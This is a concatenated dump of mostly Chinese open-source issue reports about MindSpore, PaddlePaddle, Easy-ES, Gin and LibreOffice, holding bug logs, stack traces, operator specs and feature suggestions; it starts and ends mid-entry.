sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) NativeMethodAccessorImpl.java:62 at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) DelegatingMethodAccessorImpl.java:43 at java.lang.reflect.Method.invoke(Method.java:498) Method.java:498 at com.xpc.easyes.core.proxy.EsMapperProxy.invoke(EsMapperProxy.java:28) EsMapperProxy.java:28 at com.sun.proxy.$Proxy58.insertBatch(Unknown Source) at com.example.eeuse.EeUseApplicationTests.testIndex(EeUseApplicationTests.java:53) EeUseApplicationTests.java:53 at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) NativeMethodAccessorImpl.java:62 at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) DelegatingMethodAccessorImpl.java:43 at java.lang.reflect.Method.invoke(Method.java:498) Method.java:498 @TableId(value = ""id"",type = IdType.AUTO) private Integer id; @Autowired private DocumentMapper documentMapper; @Test void testIndex(){ LambdaEsIndexWrapper&lt;Document&gt; indexWrapper = new LambdaEsIndexWrapper&lt;&gt;(); indexWrapper.indexName(Document.class.getSimpleName().toLowerCase()); //这里id的类型也同步改为Integer indexWrapper.mapping(Document::getId,FieldType.INTEGER) .mapping(Document::getTitle, FieldType.KEYWORD) .mapping(Document::getContent, FieldType.TEXT); documentMapper.createIndex(indexWrapper); Document document = new Document(1,""告诉我亲爱的"",""推*技术过硬""); Document document1 = new Document(2,""我爱你"",""推*技术过硬""); Document document2 = new Document(3,""爱"",""推*技术过硬""); Document document3 = new Document(4,""个个都话爱"",""推*技术过硬""); Document document4 = new Document(5,""爱情的代价"",""推*技术过硬""); // document.setTitle(""老汉""); // document.setContent(""推*技术过硬""); List&lt;Document&gt; list=new ArrayList&lt;&gt;(); list.add(document); list.add(document1); list.add(document2); list.add(document3); list.add(document4); //批量插入 documentMapper.insertBatch(list); }"
检验参数的建议,"使用过程中发现，控制器和检验需要写太多重复的工作。能否分离一下检验那块。 比如下面 这样路由直接注册这个handler就行了。 这样的好处理是可以更方便的选择是否需要检验。 如果再加个生成工具。这样就可以减少很多的工作量了。   <code>: func testHandler(c *gin.Context) { //这里可以执行参数校验逻辑 if err := c.ShouldBind(&amp;l); err != nil { response.ValidatorError(c, err) return } //这里直接进行调用逻辑控制器 res, err := logic.Test(l) if err != nil { c.JSON(http.StatusOK, gin.H{ ""code"": 405, ""message"": err, }) } else { c.JSON(http.StatusOK, gin.H{ ""code"": 0, ""message"": ""Success"", ""data"": res, }) } }"
如何指定所需优化parameter的初始值？,想请教大家，我刚开始使用paddlepaddle，想自己构建计算图，并且优化目标w矩阵需要设定一个指定的初始值，不知道用哪个函数可以设置初始值。 ，这个应该是要用的API，比较底层，但是不知道怎么设置特定的初始值，而且我希望能使用numpy来初始化这个参数。 Paddle里面自己定义优化目标函数的计算图需要哪些必要条件满足才能，不是很懂画计算图，或者有合适的学习资料，请大神门指点一下。   <code>: paddle.fluid.layers.create_parameter exe.run(...)
"[MS][LITE][resize]usingpackage for cpu_gpu_ascend, cbg_ai_ocr_detect_straight.pb build failed on Ascend310","使用2.0-alpha版本三合一包，cbg_ai_ocr_detect_straight.pb模型load配置信息后，build失败 / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): 无 模型转换不指定shape，生成mindir模型 加载配置信息 [ascend_context] input_shape=input:[1,-1,-1,3] dynamic_dims=[64,64],[19200,960] input_format=NHWC build模型 resize shape为{1,19200,960,3} 推理模型 推理成功且精度合理   <code>: INFO: Step [cpp_predict], cmd : cd /data/opensource_server/ascend310/tmp/; source env.sh; ./test_basic_predict ms_predict /data/opensource_server/ascend310/tmp/ /data/opensource_server/ascend310/tmp/server_resize_func_ascend310_online_005.prototxt &gt; tmp.log 2&gt;&amp;1 &amp;&amp; echo Success || echo Failed; cat tmp.log ==================== INFO: Step [cpp_predict], res: Failed [ptest]Running ms_predictLoadPrototxtConfig load prototxt file success Load context info: cpu_bind_mode = 0 Config file path is: /data/opensource_server/ascend310/tmp/data/cbg_ai_ocr_detect_straight.config LoadConfig StatusCode:0 Model file path is: /data/opensource_server/ascend310/tmp/data/cbg_ai_ocr_detect_straight.mindir [ERROR] ME(79126,7fa527090fc0,test_basic_predict):2022-12-11-03:28:40.233.513 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:142] BuildAirModel] Call aclgrphBuildModel fail. [ERROR] ME(79126,7fa527090fc0,test_basic_predict):2022-12-11-03:28:40.246.381 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:228] operator()] Convert model from MindIR to OM failed [ERROR] ME(79126,7fa527090fc0,test_basic_predict):2022-12-11-03:28:40.246.885 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:140] ChildProcess] Child process process failed [WARNING] ME(79119,7fa50db02700,test_basic_predict):2022-12-11-03:28:40.294.229 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:227] HeartbeatThreadFuncInner] Peer stopped [ERROR] ME(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:40.294.507 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:208] operator()] Receive result model from child process failed [ERROR] ME(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:40.296.031 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:118] ParentProcess] Parent process process failed [ERROR] ME(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.168 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:242] LoadMindIR] Convert MindIR model to OM model failed [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.266 [mindspore/lite/tools/converter/adapter/acl/src/acl_pass_impl.cc:310] ConvertGraphToOm] Model converter load mindir failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.299 [mindspore/lite/tools/converter/adapter/acl/src/acl_pass_impl.cc:433] BuildGraph] Convert graph to om failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.316 [mindspore/lite/tools/converter/adapter/acl/src/acl_pass_impl.cc:670] Run] Build graph failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.338 [mindspore/lite/tools/converter/adapter/acl/acl_pass.cc:37] Run] Acl pass impl run failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.359 [mindspore/lite/tools/converter/anf_transform.cc:443] RunConvertPass] Acl pass failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.489 [mindspore/lite/tools/converter/anf_transform.cc:707] RunPass] Run convert pass failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.508 [mindspore/lite/tools/converter/anf_transform.cc:805] TransformFuncGraph] Proc online transform failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.528 [mindspore/lite/tools/converter/anf_transform.cc:899] Transform] optimizer failed. [ERROR] LITE(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.585 [mindspore/lite/tools/converter/converter.cc:289] Convert] ""Transform anf graph return nullptr."" [ERROR] ME(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.606 [mindspore/lite/src/extendrt/convert/runtime_convert.cc:235] RuntimeConvert] Convert model failed [ERROR] ME(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.297.664 [mindspore/lite/src/extendrt/cxx_api/model/model_impl.cc:146] CompileGraphOnline] Failed to converter graph ((ret)==(kSuccess))Expectation Failed Testcase Name: ms_predict File: /home/jenkins-slave/workspace/mslite_testcase_compile_opensource/MindSporeTest/predict/server/cpp/test_basic_predict.cpp Line:190 [ERROR] ME(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.298.417 [mindspore/lite/src/extendrt/cxx_api/model/model_impl.cc:167] Resize] Inputs is null. ((resize_ret)==(kSuccess))Expectation Failed Testcase Name: ms_predict File: /home/jenkins-slave/workspace/mslite_testcase_compile_opensource/MindSporeTest/predict/server/cpp/test_basic_predict.cpp Line:225 [ERROR] ME(79119,7fa527090fc0,test_basic_predict):2022-12-11-03:28:41.298.786 [mindspore/lite/src/extendrt/cxx_api/model/model.cc:138] Predict] Catch exception: The pointer[kernel_graph_] is null."
Confusion about using fluid.layers functions in dygraph mode,"In example code, I found that some funcion in fluid.layers is used in dygraph mode, especially activation function like relu, tanh. And I found some operations are available in while no counterpart could be found in , such as . Is it ok (gradient with be passed correctly as least) to assume that we can use all funcion in fluid.layers in dygraph mode?   <code>: fluid.layers fluid.dygraph.nn fluid.layers.pool3d"
Can i use two kinds of loss_layer such as multibox_loss_layer and sum_cost ?,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
Refactoring Arithmetic Simplify,"Task Use this template for task tracking kind/task Task Description We have an arithmetic simplify pass in graph kernel(http://gitee.com/mindspore/mindspore/blob/master/mindspore/ccsrc/backend/optimizer/graph_kernel/arithmetic_simplify.cc). Current code has three main cons. Some bugs may cause kernel info loss Highly depend on frontend's codes A little sophisticated We need to refactor this part. Task Goal We need to fix the bugs, make this part independent (don't rely on frontend's codes any more) and concise. Sub Task In general, we want this algorithm to be general, easy for other developers to add new arithmetic expressions. Here, we may define the arithmetic expression as a kind of string. Here are some examples: Here, A,B,C .. represents different parameters. const1, const2 ... represents different consts. Func() represents for operators. We use comma to separate an operator's inputs. In our match logic, we may transform the the arithmetic string to a syntax tree and match the tree with our node graph from bottom to the top. Here is an example of syntax tree: Operators like 'Reduce' and 'Transpose' may modify parameters' internel attributes. For exapmle, after transposing A, A's shape (m,n) may be (n,m). This case may need developers's specific lambda function to modify input's internal attributes. In summary, based on the new data structure, if developers want to add a new type1 expression, they only need to insert an expression string; if developers want to add a new type2 expression, they need to insert an expression string and create a new lambda function.   <code>: 'Add(A,0)=A' //A+0=0 'Log(Exp(A))=A' //log(exp(A))=A 'Add(Add(A,const1),const2)=Add(A,Add(const1,const2))' // (A+const1)+const2=A+(const1+const2) 'Add(Mul(A,const1),Mul(B,const1))=Mul(Add(A,B),const1)' // A*const1+B*const1= (A+B)*const1"
【众智】【计算-AICPU开发】SparseApplyProximalGradientDescent,"AICPU算子接入 使用固定学习率的FOBOS算法稀疏更新var 接口目录：mindspore/ops/operations/nn_ops.py var Parameter alpha Union[Number, Tensor] l1 Union[Number, Tensor] l2 Union[Number, Tensor] grad indices var use_locking Bool 属性 对应底层算子 对应底层AICPU算子SparseApplyProximalGradientDescent TF接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/SparseApplyProximalGradientDescent 3. 异常处理 4. 算子反向 无需反向   <code>: class SparseApplyProximalGradientDescent(Primitive): REG_OP(SparseApplyProximalGradientDescent) .INPUT(var, TensorType::NumberType()) .INPUT(alpha, TensorType::NumberType()) .INPUT(l1, TensorType::NumberType()) .INPUT(l2, TensorType::NumberType()) .INPUT(grad, TensorType::NumberType()) .INPUT(indices, TensorType::IndexNumberType()) .OUTPUT(var, TensorType::NumberType()) .ATTR(use_locking, Bool, false) .OP_END_FACTORY_REG(SparseApplyProximalGradientDescent)"
if条件代码格式,"在看类的源码时发现 if条件中执行的代码块中如果有多行则使用了大括号 如果只有一行则没有使用大括号 这是开源中国内部的一个开发规范吗, 而google编程规范与阿里编程规范是只要if条件后方都加大括号 我想尽量往google编程规范与阿里编程规范靠拢比较好   <code>: CacheChannel {} {} {}"
fluid.io.load_persistables ERROR,"I save model using function. When I load a model ""model/15"", I get the following ERROR message. I can not find ""conv2d_77.w_0"" I list the file in ""model/15"" using ""ll model/15/conv2d_*"", the max index file is   <code>: save_persistables model/15/conv2d_52.w_0 paddle.fluid.core.EnforceNotMet: Cannot open file model/15/conv2d_77.w_0 for load op at [/paddle/paddle/fluid/operators/load_op.cc:39] PaddlePaddle Call Stacks: 0 0x7f31350c8416p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486 1 0x7f31359899ecp paddle::operators::LoadOp::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 1580 2 0x7f313515a626p paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool) + 1110 3 0x7f313515b554p paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) + 100 4 0x7f31350dc93bp void pybind11::cpp_function::initialize&lt;pybind11::cpp_function::initialize&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)#1}, void, paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(pybind11::cpp_function::initialize&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)#1}&amp;&amp;, void (*)(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(pybind11::detail::function_call&amp;)#3}::_FUN(pybind11::detail::function_call) + 555 5 0x7f31350d6064p pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 2596 6 0x7f318cddc55fp PyEval_EvalFrameEx + 29855 7 0x7f318cdde86dp PyEval_EvalCodeEx + 2061 8 0x7f318cddb9fcp PyEval_EvalFrameEx + 26940 9 0x7f318cdde86dp PyEval_EvalCodeEx + 2061 10 0x7f318cddb9fcp PyEval_EvalFrameEx + 26940 11 0x7f318cdde86dp PyEval_EvalCodeEx + 2061 12 0x7f318cddb9fcp PyEval_EvalFrameEx + 26940 13 0x7f318cdde86dp PyEval_EvalCodeEx + 2061 14 0x7f318cddb9fcp PyEval_EvalFrameEx + 26940 15 0x7f318cdde86dp PyEval_EvalCodeEx + 2061 16 0x7f318cddb9fcp PyEval_EvalFrameEx + 26940 17 0x7f318cdde86dp PyEval_EvalCodeEx + 2061 18 0x7f318cdde9a2p PyEval_EvalCode + 50 19 0x7f318ce07782p PyRun_FileExFlags + 146 20 0x7f318ce08af9p PyRun_SimpleFileExFlags + 217 21 0x7f318ce1e82dp Py_Main + 3149 22 0x7f318c01bbd5p __libc_start_main + 245 23 0x4007a1p"
【重庆大学众智】pointpillars模型训练时报错 ImportError: cannot import name '_get_grad_accumulation_shard' from 'mindspore.parallel._utils',": Ascend : -- MindSpore version : mindspore-ascend 1.5.0 -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : 代码之前能跑起来，近期跑报错，提示疑内部报错无法定位错误，报错行代码： loss = train_one_step( example_m[""voxels""], example_m[""num_points""], example_m[""coordinates""], example_m[""anchors""], example_m[""bev_map""], example_m[""rect""], example_m[""Trv2c""], example_m[""P2""], example_m[""anchors_mask""], example_m[""image_idx""], example_m[""labels""], example_m[""reg_targets""]) (ci3.7) # env PYTHONIOENCODING=UTF-8 PYTHONUNBUFFERED=1 /root/miniconda3/envs/ci3.7/bin/python /root/.vscode-server/extensions/ms-python.python-2020.6.91350/pythonFiles/ptvsd_launcher.py --default --client --host localhost --port 44437 /disk1/yy/code/test2/train.py source /root/miniconda3/bin/activate conda activate ci3.7 {} {'Cyclist': 5} [-1] load 14357 Car database infos load 2207 Pedestrian database infos load 734 Cyclist database infos load 1297 Van database infos load 56 Person_sitting database infos load 488 Truck database infos load 224 Tram database infos load 337 Misc database infos After filter database: load 10750 Car database infos load 2104 Pedestrian database infos load 580 Cyclist database infos load 826 Van database infos load 53 Person_sitting database infos load 321 Truck database infos load 199 Tram database infos load 259 Misc database infos remain number of infos: 3712 ------------1. build train_net------------- ------------2. start train------------- ------------3. at epoch-------------0 ------------3. at step-------------0 [WARNING] MD(70727,7f3702ffd700,python):2022-01-21-17:57:55.020.789 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:183] operator()] Bad performance attention, it takes more than 25 seconds to generator.next new row, which might cause timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. [WARNING] MD(70727,7f3702ffd700,python):2022-01-21-17:58:27.087.846 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:183] operator()] Bad performance attention, it takes more than 25 seconds to generator.next new row, which might cause timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. [WARNING] MD(70727,7f3702ffd700,python):2022-01-21-17:58:55.334.121 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:183] operator()] Bad performance attention, it takes more than 25 seconds to generator.next new row, which might cause timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. [WARNING] MD(70727,7f3702ffd700,python):2022-01-21-17:59:32.796.340 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:183] operator()] Bad performance attention, it takes more than 25 seconds to generator.next new row, which might cause timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. [ERROR] PIPELINE(70727,7f381409a740,python):2022-01-21-17:59:58.334.738 [mindspore/ccsrc/pipeline/jit/pipeline.cc:816] Compile] Traceback (most recent call last): File ""/root/.vscode-server/extensions/ms-python.python-2020.6.91350/pythonFiles/ptvsd_launcher.py"", line 48, in main(ptvsdArgs) File ""/root/.vscode-server/extensions/ms-python.python-2020.6.91350/pythonFiles/lib/python/old_ptvsd/ptvsd/main.py"", line 432, in main run() File ""/root/.vscode-server/extensions/ms-python.python-2020.6.91350/pythonFiles/lib/python/old_ptvsd/ptvsd/main.py"", line 316, in run_file runpy.run_path(target, run_name='main') File ""/root/miniconda3/envs/ci3.7/lib/python3.7/runpy.py"", line 263, in run_path pkg_name=pkg_name, script_name=fname) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/runpy.py"", line 96, in _run_module_code mod_name, mod_spec, pkg_name, script_name) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/runpy.py"", line 85, in _run_code exec(code, run_globals) File ""/disk1/yy/code/test2/train.py"", line 244, in train() File ""/disk1/yy/code/test2/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, kwargs) File ""/disk1/yy/code/test2/train.py"", line 218, in train ** example_m[""reg_targets""]) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in call out = self.compile_and_run(<em>inputs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 682, in compile_and_run self.compile(<em>inputs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 669, in compile _cell_graph_executor.compile(self, <em>inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 548, in compile result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/_grad/init.py"", line 17, in ** from . import grad_array_ops, grad_comm_ops, grad_debug_ops, grad_implementations, *</em> File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/_grad/grad_comm_ops.py"", line 21, in ** from mindspore.parallel._utils import _get_enable_parallel_optimizer, _get_grad_accumulation_shard</em></em> **ImportError: cannot import name '_get_grad_accumulation_shard' from 'mindspore.parallel._utils' (/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/parallel/_utils.py) ** [WARNING] MD(70727,7f381409a740,python):2022-01-21-17:59:59.966.556 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:00.966.790 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:01.967.038 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:02.967.306 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:03.967.533 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:04.967.704 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:05.967.899 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:06.968.129 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:07.968.336 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:08.968.576 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:09.968.906 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:10.969.093 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:11.969.316 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:12.969.580 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:13.969.837 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:14.970.106 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f381409a740,python):2022-01-21-18:00:15.970.383 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 139874250249984 is not responding. Interrupt again [WARNING] MD(70727,7f3702ffd700,python):2022-01-21-18:00:16.652.001 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:183] operator()] Bad performance attention, it takes more than 25 seconds to generator.next new row, which might cause timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function.   <code>: GetNext GetNext GetNext GetNext GetNext"
成功适配过 Linux Lab 的国内外图书、线上课程列表,大家好，本帖用于记录来自社区各个用户自行适配 Linux Lab 的实验案例情况。 欢迎图书作者、课程作者、社区用户根据需求自行适配并提交，需要贴上适配后的测试记录、使用步骤等。 如果希望新增，但是还未来得及适配的，请在开头加一个 关键字。 如果嫌自行搭建 Linux Lab 繁琐，可以直接去某宝检索 “Linux Lab真盘”，有预装 Linux Lab、Linux 0.11 Lab 等。   <code>: TODO:
mac下libreoffice/openoffice路径取值不对,"在mac下： LibreOffice的soffice没有.bin扩展名； OpenOffice的soffice有两个，一个soffice，一个是soffice.bin; 默认的代码，在mac下是无法使用的。 经测试，将OfficeUtils类的getOfficeExecutable方法中关于mac取值的 修改为： 即可在mac下对openoffice或libroffice适用。 测试环境： Mac OS 10.13.6; openoffice 4.1.6; libreOffice 6.2.4.2;   <code>: return new File(officeHome, ""MacOS/soffice.bin""); return new File(officeHome, ""MacOS/soffice"");"
[CT][MS][OCCM][segmentmin]算子在动态shape用例中出现 标杆或Mindspore为0的情况,"算子在GPU后端运行用例 test_dynamic_shape_segmentmin_input_2x3_segments_0x0_dtype_float16_and_int32出现 标杆为0或者mindspore为0, def test_dynamic_shape_segmentmin_input_2x3_segments_0x0_dtype_float16_and_int32(): data = Tensor(np.arange(2 * 3).reshape(2, 3)) segment = (0, 0) indice = sorted(np.random.randint(0, 2, size=2)) fact = SegmentMinDynamicShapeFactory(input_np_x1=data, input_np_x2=segment, indices_np=indice, loss=0.0001, dtype1=np.float16, dtype2=np.int32) ../dynamic_shape_operations/test_dynamic_shape_segmentmin.py:101: ../dynamic_shape_operations/test_dynamic_shape_segmentmin.py:71: in forward_cmp allclose_nparray(out_tf, out_me, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) data_expected = array([[3., 4., 5.]], dtype=float16) data_me = array([[0., 0., 0.]], dtype=float16), rtol = 0.0001, atol = 0.0001 E AssertionError: E data_expected_std:[3. 4. 5.] E data_me_error:[0. 0. 0.] E loss:[3. 4. 5.] ../dynamic_shape_operations/test_dynamic_shape_segmentmin.py:121: ../dynamic_shape_operations/test_dynamic_shape_segmentmin.py:71: in forward_cmp allclose_nparray(out_tf, out_me, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) data_expected = array([[[[[ 0., 0., 0.], [ 0., 0., 0.]], ...[[12., 13., 14.], [15., 16., 17.]], data_me = array([[[[[3.4028235e+38, 3.4028235e+38, 3.4028235e+38], [3.4028235e+38, 3.4028235e+38, 3.4028235e+38]], ...8000000e+01, 1.9000000e+01, 2.0000000e+01], [2.1000000e+01, 2.2000000e+01, 2.3000000e+01]]]]], dtype=float32) rtol = 1e-05, atol = 1e-05 E AssertionError: E data_expected_std:[0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0.] E data_me_error:[3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 E 3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 E 3.4028235e+38 3.4028235e+38] E loss:[3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 E 3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 3.4028235e+38 E 3.4028235e+38 3.4028235e+38] test_dynamic_shape_segmentmin_input_7x1x2x2x3x2x1_segments_0x1x2x2x3x3x4_dtype_float32_int32   <code>: fact.forward_cmp() def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ format(data_expected[greater], data_me[greater], error[greater]) def test_dynamic_shape_segmentmin_input_5x1x2x2x3_segments_0x1x2x2x3_dtype_float32_and_int32(): data = Tensor(np.arange(5 * 1 * 2 * 2 * 3).reshape(5, 1, 2, 2, 3)) segment = (0, 1, 1, 1, 1) indice = sorted(np.random.randint(0, 5, size=5)) fact = SegmentMinDynamicShapeFactory(input_np_x1=data, input_np_x2=segment, indices_np=indice, loss=0.00001, dtype1=np.float32, dtype2=np.int32) fact.forward_cmp() [[ 0., 0., 0.], [ 0., 0., 0.]]]], [[18., 19., 20.], [21., 22., 23.]]]]], dtype=float32) def 